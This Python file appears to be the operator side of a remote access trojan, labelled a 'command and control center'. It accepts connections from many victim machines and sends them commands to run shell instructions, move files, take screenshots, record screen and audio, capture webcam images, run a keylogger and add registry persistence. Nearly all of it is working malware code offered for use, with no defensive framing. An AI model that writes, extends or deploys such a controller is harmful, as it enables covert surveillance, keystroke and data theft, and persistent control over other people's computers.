import os,threading,socket as s,json
from FileHandling import FileHandler 
from DataHandling import DataHandling 
from datetime import datetime


# def file_recv(target,file):
#     # f = open(file=file,mode='wb')
#     # while chunk:
#     #     f.write(chunk)
#     #     try:
#     #         chunk = soc.recv(1024)
#     #     except s.timeout as e:
#     #         break
#     # f.close()

#     target.settimeout(3)
#     with open(os.path.join(DOWNLOAD_DIR,file),'wb') as f:
#         print("file opened...")
#         while True:
#             try:
#                 chunk = target.recv(1024)
#             except s.timeout as e:
#                 break
#             if not chunk:
#                 break
#             print("Receving data...")
#             f.write(chunk)
#         f.close()
#     target.settimeout(None)


def accept_connection():
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target,ip=sock.accept()
            targets.append(target)
            ips.append(ip)
            print("[+] {} Connected".format(ip))
        except:
            pass


def target_communication(ip,target):
    data_handler=DataHandling(soc_obj=target)
    file_handler=FileHandler(soc_obj=target)
    print("[*] Listening Incoming Connection....")
    
    def execution(command):
        data_handler.data_send(command)
        result= data_handler.data_recv()
        print(result)

    while True:
        command = input("${} ~ ".format(ip))

        if command=='quit':
            data_handler.data_send(command)
            break

        elif command == 'background':
            break

        elif command=='clear' or command=='cls':
            os.system(command)

        elif command=='cd':
            print("[*] Getting current directory...")
            execution(command)

        elif command[:2] == 'cd':
            print("* Changing directory...")
            execution(command)

        elif command[:7] == 'upload ':
            if os.path.exists(command[7:]):
                data_handler.data_send(command)
                file_handler.file_send(command[7:])
            else:
                print("path/file not exist")
                continue
        
        elif command[:9] == 'download ':
            data_handler.data_send(command)
            file_handler.file_recv(command[9:])

        # starting the screen recorder
        elif command[:19] == 'screen_record_start':
            execution(command)
            screen_record_thread = threading.Thread(target=file_handler.file_recv,args=("ScreenRecord{}.avi".format(datetime.now())))

        # terminating the screen recorder    
        elif command[:18] == 'screen_record_stop':
            execution(command)
            screen_record_thread.join()
        
        # starting the audio record
        elif command[:18] == 'record_audio_start':
            execution(command)
            record_audio_start=threading.Thread(target=file_handler.file_recv,args=("AudioRecord{}.wav".format(datetime.now())))
            
        
        # terminating the audio recording
        elif command == 'record_audio_stop':
            execution(command)
            record_audio_start.join()


        # creating persisteance in system..
        elif command[:11] =='persistance':
            execution(command)
        
        # taking the screenshot of the device
        elif command[:10]=='screenshot':
            execution(command)
            file_handler.file_recv("screenshot{}.png".format(datetime.now()))

        # starting the webcam capturing
        elif command[:13]=='web_cam_start':
            execution(command)
            web_cam_data_thread = threading.Thread(target=data_handler.data_recv)
            web_cam_thread = threading.Thread(target=file_handler.file_recv,args=("WebCam{}.png".format(datetime.now())))
            web_cam_thread.start()
            web_cam_data_thread.start()
            

        # terminating the webcam capturing
        elif command[:12] == 'web_cam_stop':
            execution(command)
            web_cam_thread.join()
            web_cam_data_thread.join()


        # start the keylogger
        elif command[:15]=='keylogger_start':
            execution(command)
            

        # receving the key strocks
        elif command[:14]=='keylogger_dump':
            execution(command)
            

        # destroy the keylogger
        elif command[:14]=='keylogger_stop':
            execution(command)
            

        elif command=='help':
            print("\n"+
            '#   quit                                       --> Close Session and stop process\n'+
            '#   clear                                      --> Clear the screen\n'+
            '#   upload <file_name/path>                    --> Upload a file \n'+
            '#   download <file_name/path>                  --> Download a file\n'+
            '#   screenshot                                 --> Taking the screenshot\n'+
            '#   screen_record_start <duration(sec)>        --> Start record the screen of the device and record for given second (default 86400)\n'+
            '#   screen_record_stop                         --> Stop record the screen of the device at any point and return the .avi file\n'+
            '#   keylogger_start                            --> start the keylogger\n'+
            '#   keylogger_dump                             --> Key strocks dump\n'+
            '#   keylogger_stop                             --> stop the keylogger\n'+
            '#   record_audio_start <duration(sec)>         --> Start the audio recording and record for given second (default 86400)\n'+
            '#   record_audio_stop                          --> Stop the audio recording at any point and return the .wav file\n'+
            '#   web_cam_start                              --> Start the web cam and capture picture in every 3 sec\n'+
            '#   web_cam_stop                               --> Stop the web cam \n'+
            '#   persistance <registry_name> <file_name>    --> Create Persistance in Registry\n',end='\n')
        else:
            execution(command)


sock = s.socket(s.AF_INET,s.SOCK_STREAM) 
# public ip '103.154.234.176'
sock.bind((s.gethostbyname(s.gethostname()),1433))
DOWNLOAD_DIR="C:\\Users\\akash\\Downloads"

sock.listen(50)
targets,ips=[],[]
stop_flag=False
t1 = threading.Thread(target=accept_connection)
t1.start()


print("\t::==============================================::")
print("\t::========:: COMMAND & CONTROL CENTER ::========::")
print("\t::==============================================::")

while True:
    
    command = input("$ ~ ")

    if command=='help':
        print("\ttargets            --> Show all the targets\n"+
              "\tsession <no.>      --> Select the session no.\n"+
              "\tclear/cls          --> Clear the screen\n"+
              "\texit               --> Exit from all the targets\n"+
              "\tkill <no.>         --> Kill a specific target\n"+
              "\tq                  --> Exit from command center\n")
    elif command=='targets':
        c=0
        for ip in ips:
            print("[@]  session {} => {}".format(c,ip))
            c+=1
    
    elif command=='q':
        break

    elif command=='clear' or command=='cls':
        os.system(command)
    
    elif command[:7]=='session':
        try:
            num = command[8:]
            target_num = targets[num]
            target_ip = ips[num]
            target_communication(ip=target_ip,target=target_num)
        except:
            print("[~] No session exist under this [{}] ".format(command[8:]))
    
    elif command[:4]=='exit':
        for target in targets:
            data_handler=DataHandling(target)
            data_handler.data_send('quit')
            target.close()
        sock.close()
        stop_flag=True
        t1.join()
        break
    
    elif command[:4]=='kill':
        target_kill = targets[int(command[5:])]
        ip_kill = ips[int(command[5:])]
        data_handler=DataHandling(target_kill)
        data_handler.data_send(data='quit')
        target_kill.close()
        targets.remove(target_kill)
        ips.remove(ip_kill)
    
    elif command[:7]=='sendall':
        x=len(targets)
        print(x)
        i=0
        try:
            while i<x:
                target_num=targets[i]
                data_handler=DataHandling(target_num)
                data_handler.data_send(data=command[8:])
                i+=1
        except:
            print("Failed..")
    else:
        print("[!!] Command does not exist..")
        
print("\t::===============================::")
print("\t::=======:: THANK YOU  ::========::")
print("\t::===============================::")
exit()